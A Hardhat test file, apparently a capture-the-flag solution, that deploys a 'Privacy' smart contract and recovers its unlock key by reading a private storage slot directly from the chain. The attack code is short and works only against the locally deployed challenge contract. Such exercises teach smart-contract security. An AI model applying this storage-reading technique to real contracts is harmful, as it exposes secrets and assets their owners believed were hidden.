import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Privacy";
const ATTACKER_NAME = "PrivacyAttacker";

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const data = [
      ethers.utils.formatBytes32String("pass1"),
      ethers.utils.formatBytes32String("pass2"),
      ethers.utils.formatBytes32String("pass3"),
    ];

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy(data);
    await contract.deployed();

    contract = contract.connect(attacker);
  });

  it("Solves the challenge", async () => {
    const dataArraySlot = 5;
    const key32 = await ethers.provider.getStorageAt(contract.address, dataArraySlot);
    const key16 = key32.slice(0, 16 * 2 + 2); // 16 bytes * 2 char + 2 char (0x)

    const tx = await contract.unlock(key16);
    await tx.wait();

    expect(await contract.locked()).to.be.false;
  });
});
